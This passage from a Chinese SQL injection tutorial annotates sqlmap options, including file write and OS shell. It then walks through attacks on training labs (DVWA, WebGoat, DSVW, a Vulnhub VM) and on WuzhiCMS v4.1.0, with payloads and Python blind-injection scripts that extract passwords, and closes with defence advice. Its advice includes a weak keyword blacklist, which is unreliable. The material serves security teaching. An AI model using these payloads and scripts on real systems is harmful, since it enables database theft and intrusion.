--dns-domain=DNS.. 如果你控制了一台dns服务器，使用这个可以提高效率。例： --dns-domain 123.com
--second-order=S.. 在这个页面注入的结果，在另一个页面显示。例： --second-order 1.1.1.1/b.php
```
（7）Fingerprint
```
-f, --fingerprint 指纹信息，返回DBMS，操作系统，架构，补丁等信息。
```
（8）Enumeration
```
-a, --all 查找全部，很暴力。直接用-a
-b, --banner 查找数据库管理系统的标识。直接用-b
--current-user 当前用户，常用，直接用--current-user
--current-db 当前数据库，常用，直接用--current-db
--hostname 主机名，直接用--hostname
--is-dba
--users 查询一共都有哪些用户，常用，直接用--users
--passwords 查询用户密码的哈希，常用，直接用--passwords
--privileges 查看特权，常用。例： --privileges -U username (CU 就是当前用户)
--roles 查看一共有哪些角色（权限），直接用--roles
--dbs 目标服务器中有什么数据库，常用，直接用--dbs
--tables 目标数据库有什么表，常用，直接用--tables
--columns 目标表中有什么列，常用，直接用--colums
--schema 目标数据库数据库系统管理模式。
--count 查询结果返回一个数字，即多少个。
--dump 查询指定范围的全部数据。例： --dump -D admin -T admin -C username
--dump-all 查询全部数据。例： --dump-all --exclude-sysdbs
--search 搜索列、表和/或数据库名称。
--comments 检索数据库的备注。
-D DB 指定从某个数据库查询数据，常用。例： -D admindb
-T TBL 指定从某个表查询数据，常用。例： -T admintable
-C COL 指定从某个列查询数据，常用。例： -C username
-X EXCLUDE 指定数据库的标识符。
-U USER 一个用户，通常和其他连用。例： --privileges -U username (CU 就是当前用户)
--exclude-sysdbs 除了系统数据库。
--pivot-column=P.. 枢轴列名，不懂。
--where=DUMPWHERE 在dump表时使用where限制条件。
--start=LIMITSTART 设置一个起始，通常和--dunmp连用。
--stop=LIMITSTOP 同上，设置一个结束。
--first=FIRSTCHAR 以第一个查询输出的字符检索，不懂。
--last=LASTCHAR 以最后一个查询输出的字符检索，不懂+2。
--sql-query=QUERY 执行一个sql语句。
--sql-shell 创建一个sql的shell。
--sql-file=SQLFILE 执行一个给定文件中的sql语句
```
（9）Brute force
```
--common-tables 检查有没有记录表信息的公共表，比如mysql>=5.0会有一个information_schema库，储存了整个数据库的基本信息。有这个会方便很多。
--common-columns 有没有记录公共列的表，比如Access就没有列信息。这两种方法都会使用暴力破解。
```
（10）User-defined function injection
```
--udf-inject 编译共享库创建并上传至DB Server，生成UDF实现高级注入，不懂。
--shared-lib=SHLIB 同上，不懂。
```
（11） File system access
```
--file-read=RFILE 读取目标站点的一个文件。例： --file-read="/etc/password"
--file-write=WFILE 写入到目标站点的一个文件，通常和--sql-query 连用。例： --sql-query="select "一句话木马" --file-write="shell.php"
--file-dest=DFILE 同上，只是使用绝对路径写入。
```
（12） Operating system access
```
--os-cmd=OSCMD 执行一句系统命令。例： --os-shell="ipconfig -all"
--os-shell 创建一个对方操作系统的shell，远程执行系统命令。直接用即可--os-shell
--os-pwn 同上，获取一个OOB shell，meterpreter或VNC。
--os-smbrelay 同上，一键获取一个OOB shell，meterpreter或VNC。
--os-bof 利用缓冲区溢出。
--priv-esc 自动提权，数据库进程用户权限提升。
--msf-path=MSFPATH Metasploit Framework本地的安装路径。
--tmp-path=TMPPATH 远程临时文件目录的绝对路径。
```
（13） Windows registry access
```
--reg-read 读一个Windows注册表。
--reg-add 添加一个注册表。
--reg-del 删一个注册表。
--reg-key=REGKEY 和之前连用，注册表key值。
--reg-value=REGVAL 和之前连用，注册表值。
--reg-data=REGDATA 和之前连用，注册表数据。
--reg-type=REGTYPE 和之前连用，注册表类别。
```
（14） General
```
-s SESSIONFILE 从一个文件加载保存的session。
-t TRAFFICFILE 记录流文件的保存位置。
--batch 批处理，在检测过程中会问用户一些问题，使用这个参数统统使用默认值。
--binary-fields=.. 指定二进制结果的字段。
--check-internet 在评估目标之前检查互联网连接，新功能。
--crawl=CRAWLDEPTH 从起始位置爬取的深度。例： --crawl=3
--crawl-exclude=.. 除了哪些页面之外全部爬取。例： --crawl-exclude="abc.com/logout.php"
--csv-del=CSVDEL 指定在CSV输出中使用的分隔字符。
--charset=CHARSET 强制字符串编码。例： --charset=GBK
--dump-format=DU.. 转储数据的格式 ，有(CSV (默认)， HTML，SQLITE)三种。
--encoding=ENCOD.. 用于数据检索的字符编码。例： --encoding=GBK
--eta 显示每个输出的预计到达时间 。
--flush-session 清空会话信息。
--forms 在目标URL上解析和测试表单。
--fresh-queries sqlmap每次查询都会讲查询结果储存在.sqlmap文件夹中，下次再有相同测查询会调用上次的查询结果，使用这个参数可以忽略文件中有的记载结果，重新查询。
--har=HARFILE 将所有http流量记录在一个har文件中。
--hex dump非ascii字符时，将其编码为16进制，收到后解码还原。
--output-dir=OUT.. 输出结果至文件。例： --output-dir=/tmp
--parse-errors 解析并显示报错信息。
--save=SAVECONFIG 将使用的命令保存到配置ini文件
--scope=SCOPE 和-l类似，只是这个可以过滤信息，使用正则表达式过滤网址。
--test-filter=TE.. 根据有效负载和/或标题，不懂。
--test-skip=TEST.. 根据有效负载和/或标题跳过测试，不懂+2。
--update 更新sqlmap。
```
（15） Miscellaneous
```
-z MNEMONICS 参数助记符，比较傻的一个功能。例： -z "bat,randoma,ign,tec=BEU" 其实就是只要你写的字母可以唯一匹配其他参数，就可以生效。
--alert=ALERT 在找到SQL注入时运行主机OS命令。
--answers=ANSWERS 设置问题答案，在刚刚的--batch 可以跳过很多问题，但只是选择默认值，可以使用者个参数对特定问题设定特定答案。例： --answer "extending=N"
--beep 在问题和/或当SQL注入被发现时发出嘟嘟声。。。。。。。。。
--cleanup 从SqLMAP特定的UDF和表中找数据库，类似暴力破解。
--dependencies 检查缺少的Sql映射依赖项。
--disable-coloring 禁用控制台输出着色。
--gpage=GOOGLEPAGE 在指定页使用google结果，不懂。
--identify-waf 识别目标的防火墙。
--mobile cosplay 手机。
--offline 在脱机模式下工作。
--purge-output 情况输出文件夹。
--skip-waf 跳过WAF/IPS/IDS保护的启发式检测。
--smart 有大量检测目标时候，只选择基于错误的检测。
--sqlmap-shell 创建一个交互的sqlmap_shell，不懂。
--tmp-dir=TMPDIR 更改存储临时文件的本地目录。
--web-root=WEBROOT 设置Web服务器文档根目录。例： --web-root="/var/www"
--wizard 新手教程。
```
#### 6.2.2.2 SQLMAP攻击实例

（1）查看当前数据库

```
py3 sqlmap.py -u "http://192.168.123.20/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=248dmjg65dksvfvf8kk0k7vqj0; security=low" --current-db
```

![1559655198515](assets/1559655198515.png)

（2）查看当前用户

```
py3 sqlmap.py -u "http://192.168.123.20/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=248dmjg65dksvfvf8kk0k7vqj0; security=low" --current-user
```

![1559655403932](assets/1559655403932.png)

（3）查看全部数据库

```
py3 sqlmap.py -u "http://192.168.123.20/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=248dmjg65dksvfvf8kk0k7vqj0; security=low" --dbs
```

![1559655486452](assets/1559655486452.png)

（4）查看数据库全部表
```
py3 sqlmap.py -u "http://192.168.123.20/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=248dmjg65dksvfvf8kk0k7vqj0; security=low" -D dvwa --tables
```

![1559655542253](assets/1559655542253.png)

（5）查看表字段

```
py3 sqlmap.py -u "http://192.168.123.20/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=248dmjg65dksvfvf8kk0k7vqj0; security=low" -D dvwa -T users --columns
```

![1559655623753](assets/1559655623753.png)

（6）查看数据

```
py3 sqlmap.py -u "http://192.168.123.20/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=248dmjg65dksvfvf8kk0k7vqj0; security=low" -D dvwa -T users -C user,password --dump
```

![1559655752250](assets/1559655752250.png)



## 6.3 其他靶场
### 6.3.1 WebGoat

#### 6.3.1.2 WebGoat 简介

WebGoat是OWASP组织研制出的用于进行web漏洞实验的Java靶场程序，用来说明web应用中存在的安全漏洞。WebGoat运行在带有java虚拟机的平台之上，当前提供的训练课程有30多个，其中包括：跨站点脚本攻击（XSS）、访问控制、线程安全、操作隐藏字段、操纵参数、弱会话cookie、SQL盲注、数字型SQL注入、字符串型SQL注入、web服务、Open Authentication失效、危险的HTML注释等等。

#### 6.3.1.3 WebGoat安装

```
https://github.com/WebGoat/WebGoat/releases/download/v8.0.0.M25/webgoat-server-8.0.0.M25.jar
https://github.com/WebGoat/WebGoat/releases/download/v8.0.0.M25/webwolf-8.0.0.M25.jar
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190526224806456.png)
默认是127.0.0.1 ，只能本机访问，需要更改
 java -jar webgoat-server-8.0.0.M25.jar --server.address=0.0.0.0
![在这里插入图片描述](https://img-blog.csdnimg.cn/2019052622534765.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FpeGl4eHg=,size_16,color_FFFFFF,t_70)
需更新到最新的java版本

```
https://www.oracle.com/technetwork/java/javase/downloads/jdk12-downloads-5295953.html
```
安装java步骤省略，安装好开始运行
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190526230212918.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/2019052623024422.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FpeGl4eHg=,size_16,color_FFFFFF,t_70)
访问http://192.168.123.25:8080/WebGoat

#### 6.3.1.4 测试过程
（1）SQL Injection (advanced)

输入除非字符型注入admin' or '1'='1

![1559798103880](assets/1559798103880.png)

![1559798128119](assets/1559798128119.png)

7能正常显示8就不可以正常显示了说明字段为7个

![1559799651338](assets/1559799651338.png)

![1559799681152](assets/1559799681152.png)

Smith' union select 1,'2','3','4','5','6',7 from user_data --

![1559799993320](assets/1559799993320.png)

Smith' union select 1,database(),user_name,password,'5','6',7 from user_system_data --

![1559800167942](assets/1559800167942.png)

![1559800208287](assets/1559800208287.png)



（2）SQL Injection (mitigation)

防御sql注入，其实就是session，参数绑定，存储过程这样的注入。

``` 
// 利用session防御，session内容正常情况下是用户无法修改的
select * from users where user = "'" + session.getAttribute("UserID") + "'";
 
//  参数绑定方式，利用了sql的预编译技术
String query = "SELECT * FROM users WHERE last_name = ?";
PreparedStatement statement = connection.prepareStatement(query);
statement.setString(1, accountName);
ResultSet results = statement.executeQuery();
```
上面说的方式也不是能够绝对的进行sql注入防御，只是减轻。

如参数绑定方式可以使用下面方式绕过。
通过使用case when语句可以将order by后的orderExpression表达式中添加select语句。

```
 select * from users order by lastname;
------------------------------------------------------------------------------------
 
SELECT ...
FROM tableList
[WHERE Expression]
[ORDER BY orderExpression [, ...]]
 
orderExpression:
{ columnNr | columnAlias | selectExpression }
    [ASC | DESC]
 
selectExpression:
{ Expression | COUNT(*) | {
    COUNT | MIN | MAX | SUM | AVG | SOME | EVERY |
    VAR_POP | VAR_SAMP | STDDEV_POP | STDDEV_SAMP
} ([ALL | DISTINCT][2]] Expression) } [[AS] label]
 
Based on HSQLDB
---------------------------------------------------------------------------------------
 
select * from users order by (case when (true) then lastname else firstname)
```

### 6.3.2 DSVW 

#### 6.3.2.1 DSVW 简介
Damn Small Vulnerable Web (DSVW) 是使用 Python 语言开发的 Web应用漏洞 的演练系统。其系统只有一个 python 的脚本文件组成, 当中涵盖了 26 种 Web应用漏洞环境, 并且脚本代码行数控制在了100行以内, 当前版本v0.1m。需要python (2.6.x 或 2.7)并且得安装lxml库

#### 6.3.2.2 DSVW 下载

#### 6.3.2.3 DSVW 安装
安装python-lxml，再下载DSVW
```
apt-get install python-lxml
git clone https://github.com/stamparm/DSVW.git
```
直接运行
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190527122236280.png)![在这里插入图片描述](https://img-blog.csdnimg.cn/20190527122253950.png)
如果出现ip无法访问的情况改一下代码即可
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190527122505965.png)

（1）Blind SQL Injection (boolean)

![1559800554388](assets/1559800554388.png)

说明存在盲注

```
?id=2%20AND%201=1 正常显示
?id=2%20AND%201=2 显示不正常
```

构造语句进行盲注，发现不能使用mid只能使用substr。。

```
2 and mid((select password from users where name='admin'),1,1)='7' 不能正常显示
2 and substr((select password from users where name='admin'),1,1)='7'  能正常显示
http://192.168.123.25:65412/?id=2%20and%20substr((select%20password%20from%20users%20where%20name=%27admin%27),2,1)=%27e%27
密码第一位7第二位e
通过之前做的python脚本跑出来密码是7en8aiDoh!
```

（2）Blind SQL Injection (time)

```
http://192.168.123.25:65412/?id=1 and (SELECT (CASE WHEN (SUBSTR((SELECT password FROM users WHERE name='admin'),2,1)='e') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000))))) ELSE 0 END))
```

```
这个漏洞环境用到了 SQLITE3 中的 CASE 窗口函数与 RANDOMBLOB 来实现的基于时间的盲注。 
MSQL: sleep(2) 
MSSQL: WAITFOR DELAY '0:0:2'
```

（3）UNION SQL Injection

基于联合查询注入: 使用`UNION`运算符用于SQL注入，`UNION`运算符是关联两个表的查询结果。攻击者故意伪造的恶意的查询并加入到原始查询中, 伪造的查询结果将被合并到原始查询的结果返回，攻击者会获得其他表的信息。

```
http://192.168.123.25:65412/?id=2 UNION ALL SELECT NULL, NULL, NULL, (SELECT id||','||username||','||password FROM users WHERE username='admin')
```



# 7. 真实靶场演练
这里我们采用Vulnhub靶场进行演练。
## 7.1 Vulnhub 简介
Vulnhub是一个提供各种漏洞环境的靶场平台，供安全爱好者学习渗透使用，大部分环境是做好的虚拟机镜像文件，镜像预先设计了多种漏洞，需要使用VMware或者VirtualBox运行。每个镜像会有破解的目标。
## 7.2 Vulnhub 安装

> - 下载(https://www.gracefulsecurity.com/Seattle-0.0.3.7z)

![1559804239019](assets/1559804239019.png)

## 7.3 靶场漏洞介绍

Graceful的VulnVM是在虚拟机上运行的Web应用程序，它旨在模拟一个简单的电子商务风格网站，该网站特意容易受到Web应用程序中常见的许多众所周知的安全问题的影响。这实际上是该项目的预发布预览版，但它确实具有实用性，但我计划在不久的将来对此进行大量工作。

该计划最终使应用程序容易受到大量问题的影响，选择不同的过滤器处于不同的困难，以便测试人员能够更好地检测和利用应用程序可以通过常见的开发方法加强的问题，以便测试人员能够更广泛的经验。

第一批过滤器现已实施！该应用程序现在支持“级别”，其中级别1不包括用户输入的实际过滤，级别2包括针对每个易受攻击的功能的简单过滤器。

## 7.4 靶场实战演示

### 7.4.1 第一个盲注
在products.php页面存在盲注，通过测试发现是数字型盲注

```
http://10.1.0.239/products.php?type=1%20and%201=1  能正常显示
http://10.1.0.239/products.php?type=1%20and%201=2  不能正常显示
```

构造语句爆破数据库名，使用之前的python脚本进行爆破。

```
http://10.1.0.239/products.php?type=1%20and%20mid(database(),1,1)=%27D%27
```

爆破出来数据库名为seattle

![1559815650493](assets/1559815650493.png)

判断出来数据库存在3个表

```
http://10.1.0.239/products.php?type=1%20and%20(select%20count(table_name)%20from%20information_schema.tables%20where%20table_schema=database())=3 
```
三个表名
```
url="http://10.1.0.239/products.php?type=1%20and%20mid%28%28select%20table_name%20from%20information_schema.tables%20where%20table_schema%3ddatabase%28%29%20limit%200,1%29,1,1%29%3d%27t%27"
```

![1559817167907](assets/1559817167907.png)

开始爆字段，用如下语句

```
and mid((select column_name from information_schema.columns where table_name='tblblogs' limit 0,1),1,1)='t'
```

一直爆不出来字段，发现原来是这种爆破脚本存在一个无法分辨大小写的问题。
改进一下脚本,变成ASCII的判断。

```python
"""
@Product:DVWA 
@Author:Aixic
@create：2019-06-04-19:33
"""
import urllib.request

header={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36'
    ,'Cookie': 'level=1','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'}
if __name__ == '__main__':
    a=""
    c = 0
    for k in range(0,20):
        a+="\r\n"+str(k)+":"
        if c==2:
            print("结束了")
            exit()
        for i in range(1,20):
            for j in range(255):
                #j="t"
                url="http://10.1.0.239/products.php?type=1%20and%28select%20ascii%28mid%28%28select%20table_name%20from%20information_schema.tables%20where%20table_schema=database%28%29%20limit%20"+str(k)+",1%29,"+str(i)+",1%29%29%29="+str(j)+""
                try:
                    #print(url)
                    rp = urllib.request.Request(url, headers=header)
                    respon = urllib.request.urlopen(rp)
                    html = respon.read().decode('utf-8')
                    #print(html)
                    #exit()
                    if "Foo Vinyl" in html:
                        if j==0:
                            break
                        #print(j)
                        a+=chr(j)
                        print(a)
                        c = 0
                        break
                except:
                    continue
        c += 1
```

![1559820377925](assets/1559820377925.png)

重新尝试爆破字段，改一下语句,用python来跑

```
http://10.1.0.239/products.php?type=1%20and(select%20ascii(mid((select%20column_name%20from%20information_schema.columns%20where%20table_name=%27tblMembers%27%20limit%200,1),1,1)))=111
```

![1559820682538](assets/1559820682538.png)

再去爆破数据。
用户名

```
http://10.1.0.239/products.php?type=1%20and(select%20ascii(mid((select%20username%20from%20seattle.tblMembers%20limit%200,1),1,1)))=111
```

![1559821130952](assets/1559821130952.png)

密码

```
http://10.1.0.239/products.php?type=1%20and(select%20ascii(mid((select%20password%20from%20seattle.tblMembers%20limit%200,1),1,1)))=111
```

![1559821409047](assets/1559821409047.png)

最终代码如下，因为可能会因为字符长度过长导致时间过长的问题，就加了个判断d，这样40位的名字也可进行判断

```python
"""
@Product:DVWA 
@Author:Aixic
@create：2019-06-04-19:33
"""
import urllib.request

header={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36'
    ,'Cookie': 'level=1','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'}
if __name__ == '__main__':
    a=""
    c = 0
    for k in range(0,20):
        a+="\r\n"+str(k)+":"
        if c==2:
            print("结束了")
            exit()
        d=0
        for i in range(1,40):
            if d ==2:
                print("结束了")
                exit()
            for j in range(255):
                url="http://10.1.0.239/products.php?type=1%20and%28select%20ascii%28mid%28%28select%20password%20from%20seattle.tblMembers%20limit%20"+str(k)+",1%29,"+str(i)+",1%29%29%29="+str(j)
                try:
                    #print(url)
                    #print(d)
                    rp = urllib.request.Request(url, headers=header)
                    respon = urllib.request.urlopen(rp)
                    html = respon.read().decode('utf-8')
                    #print(html)
                    #exit()
                    if "Foo Vinyl" in html:
                        if j==0:
                            break
                        #print(j)
                        a+=chr(j)
                        print(a)
                        c = 0
                        d = 0
                        break
                except:
                    continue
            d += 1
        c += 1
```

### 7.4.2 报错注入

```
http://10.1.0.239/details.php?prod=1and&type=1
```
说明存在5个字段
```
http://10.1.0.239/details.php?prod=1%20order%20by%205&type=1 没报错
http://10.1.0.239/details.php?prod=1%20order%20by%206&type=1 报错了
```
进行UNION注入构造语句，发现并没有显示位。所以只能进行报错盲注了

```
http://10.1.0.239/details.php?prod=1%20union%20select%201,2,3,4,5&type=1
```
跟上面几乎一样，就是利用的地方不一样
```
http://10.1.0.239/details.php?prod=1%20and(select%20ascii(mid((select%20password%20from%20seattle.tblMembers%20limit%200,1),1,1)))=100&type=1
```


## 7.5 漏洞修补建议

### 7.5.1 使用htmlspecialchars函数在GET输入做一个过滤。

![1559822934334](assets/1559822934334.png)

### 7.5.2 使用strpos函数在GET输入做判断是否存在关键字。

可以自定义关键字建立数组即可

```
function foo($arg)
{
    #echo $arg;
    $array = array("and", "or","xxx");
    for ($i=0; $i < 2; $i++) { 
    	if (strpos($arg,$array[$i])!== false){
        die("警告");
    }
    }
    return $arg;
}
```

![1559824483123](assets/1559824483123.png)

### 7.5.3 使用PDO进行加固

把查询语句弄成一个对象，通过函数判断输入进来的值是否为数字，然后再通过正则替换内容

使用参数化查询可有效避免SQL注入


# 8. CMS实战演练

## 8.1 CMS介绍

五指互联由原盛大集团PHPCMS负责人王参加创办，汇聚众多国内资深CMS开发者，拥有一支战斗力强、专业的技术团队，有超过10年的CMS专业开发经验。

## 8.2 CMS下载

五指CMS官网：https://www.wuzhicms.com/

网站源码版本：五指CMS v4.1.0 UTF-8 开源版

程序源码下载：https://www.wuzhicms.com/download/



## 8.3 漏洞代码分析

1、漏洞文件位置：/coreframe/app/promote/admin/index.php 第42-60行：

```


public function search() {  
    $siteid = get_cookie('siteid');  
    $page = isset($GLOBALS['page']) ? intval($GLOBALS['page']) : 1;  
    $page = max($page,1);  
    $fieldtype = $GLOBALS['fieldtype'];  
    $keywords = $GLOBALS['keywords'];  
    if($fieldtype=='place') {  
        $where = "`siteid`='$siteid' AND `name` LIKE '%$keywords%'";  
        $result = $this->db->get_list('promote_place', $where, '*', 0, 50,$page,'pid ASC');  
         $pages = $this->db->pages;  
         $total = $this->db->number;  
         include $this->template('listingplace');  
     } else {  
         $where = "`siteid`='$siteid' AND `$fieldtype` LIKE '%$keywords%'";  
         $result = $this->db->get_list('promote',$where, '*', 0, 20,$page,'id DESC');  
         $pages = $this->db->pages;  
         $total = $this->db->number;  
         include $this->template('listing');  
     }  
```

## 8.4 漏洞实战演示

构造url链接，使用SQLMAP可获取数据库敏感数据。

Payload：

```
http://10.1.1.6/index.php?m=promote&f=index&v=search&_su=wuzhicms&fieldtype=place&keywords=1111%'*%23
```

 ![1559825805791](assets/1559825805791.png)

抓包把数据包放到sqlmap上跑

```html
GET /index.php?m=promote&f=index&v=search&_su=wuzhicms&fieldtype=place&keywords=1111%%27*%23 HTTP/1.1
Host: 10.1.1.6
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Cookie: PHPSESSID=e7qnm2dis4d18e28k6dla00gj1; XHV_uid=nX7CXoL%2FmTtWpu9BxI8h6Q%3D%3D; XHV_username=wP2OI%2B5dB0HgOUo0%2F9IuFA%3D%3D; XHV_wz_name=LCMQtntZUxcXN9%2BtUJuyXA%3D%3D; XHV_siteid=qs71GIOYdXiGHTG0Itnn2g%3D%3D
Upgrade-Insecure-Requests: 1
```

![1559826257426](assets/1559826257426.png)

## 8.5 漏洞修补建议

### 8.5.1 使用htmlspecialchars函数在GET输入做一个过滤。

![1559822934334](../../%E7%AC%94%E8%AE%B0/SQL/assets/1559822934334.png)

### 8.5.2 使用strpos函数在GET输入做判断是否存在关键字。

可以自定义关键字建立数组即可

```
function foo($arg)
{
    #echo $arg;
    $array = array("and", "or","xxx");
    for ($i=0; $i < 2; $i++) { 
    	if (strpos($arg,$array[$i])!== false){
        die("警告");
    }
    }
    return $arg;
}
```

![1559824483123](../../%E7%AC%94%E8%AE%B0/SQL/assets/1559824483123.png)

### 8.5.3 使用PDO进行加固

把查询语句弄成一个对象，通过函数判断输入进来的值是否为数字，然后再通过正则替换内容

使用参数化查询可有效避免SQL注入

# 9. SQL漏洞防御
## 9.1 数据库用户权限分明
## 9.2 代码层防御 常用过滤变量
## 9.3 str_replace()替换过滤
单引号（’）
双引号（"）
反斜杠（\）
NULL

## 9.4 htmlspecialchars()函数 实体化过滤
预定义的字符是：
& （和号）成为 &
" （双引号）成为 "
’ （单引号）成为 ’
<>成为 <>
就是把成变成一个纯字符_(:з」∠)_

## 9.5 addslashes()函数 添加转义字符
会在以下关键词前面添加转义字符
单引号（’）
双引号（"）
反斜杠（\）
NULL

## 9.6 输入验证
## 9.7 编码输出
## 9.8 使用PDO预编译语句

